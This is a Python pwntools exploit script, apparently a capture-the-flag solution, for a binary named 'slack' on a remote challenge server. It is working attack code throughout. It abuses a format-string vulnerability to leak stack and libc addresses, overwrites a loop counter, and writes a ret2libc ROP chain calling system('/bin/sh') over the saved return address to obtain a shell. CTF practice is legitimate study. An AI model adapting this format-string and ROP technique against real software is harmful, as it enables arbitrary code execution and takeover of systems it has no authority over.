from pwn import *
context.binary=exe=ELF("./slack",checksec=False)
libc=ELF('./libc.so.6',checksec=False)
def GDB():
    gdb.attach(p,gdbscript=
        '''
        b*main+453
        c
        ''')
    input()
p=remote("challs.actf.co",31500)
#p=process(exe.path)
#GDB()
###########################
'''
leak stack-> tinh duoc stack base-> tinh duoc dia chi cua i (stack base=leak -0x1e748)
viet i len stack vaf thay doi no (i=stackbase +0x1e5c8)
'''
###### stage 1: leak stack###############
payload=b'%25$p'
p.sendlineafter(b'Professional): ',payload)
p.recvuntil(b" You: ")
leak=int(p.recv(14),16)
stack=leak-0x1e748
i_address=stack+0x1e5c8
saved_rip=i_address+0x70
log.info('[+]leak:'+hex(leak))
log.info('[+]stack:'+hex(stack))
log.info('[+]i addess:'+hex(i_address))
log.info('[+]saved rip:'+hex(saved_rip))

###### stage2 : over write i address#####
payload=f'%{(i_address&0xffff)+2}c%25$hn'.encode()
p.sendafter(b'Professional): ',payload)
payload=f'%{0xffff}c%55$hn'.encode()
p.sendlineafter(b'Professional): ',payload)


########stage3 leak libc###
payload=b'%21$p'
p.sendlineafter(b'Professional): ',payload)
p.recvuntil(b" You: ",drop=True)
p.recvuntil(b" You: ")
leak2=int(p.recv(14),16)
libc.address=leak2-0x29d90
log.info('[+]leak2:'+hex(leak2))
log.info('[+]libc base:'+hex(libc.address))
log.info('[+]/bin/sh:'+hex(next(libc.search(b'/bin/sh'))))
log.info('[+]system:'+hex(libc.sym['system']))
pop_rdi=libc.address+0x000000000002a3e5
pop_rsi=libc.address+0x000000000002be51
bin_sh=next(libc.search(b'/bin/sh'))
ret=libc.address+0x0000000000029cd6

####### stage4: ret2libc############# 
log.info('[+]ROPPING')
def ROP(address,gadget):
    payload=f'%{(address&0xffff)}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{gadget&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)

    byte=int('0x'+str(hex(gadget))[6:10],16)
    payload=f'%{(address&0xffff)+2}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{(byte)&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)

    byte=int(str(hex(gadget))[0:6],16)
    payload=f'%{(address&0xffff)+4}c%28$hn'.encode()
    p.sendafter(b'Professional): ',payload)
    payload=f'%{(byte)&0xffff}c%55$hn'.encode()
    p.sendlineafter(b'Professional): ',payload)

ROP(saved_rip,pop_rsi)
ROP(saved_rip+16,pop_rdi)
ROP(saved_rip+24,bin_sh)
ROP(saved_rip+32,ret)
ROP(saved_rip+40,libc.sym['system'])


#######return##############
payload=f'%{(i_address&0xffff)+2}c%28$hn'.encode()
p.sendafter(b'Professional): ',payload)
payload=f'%{0x2}c%55$n'.encode()
p.sendlineafter(b'Professional): ',payload)
## get shell
p.interactive()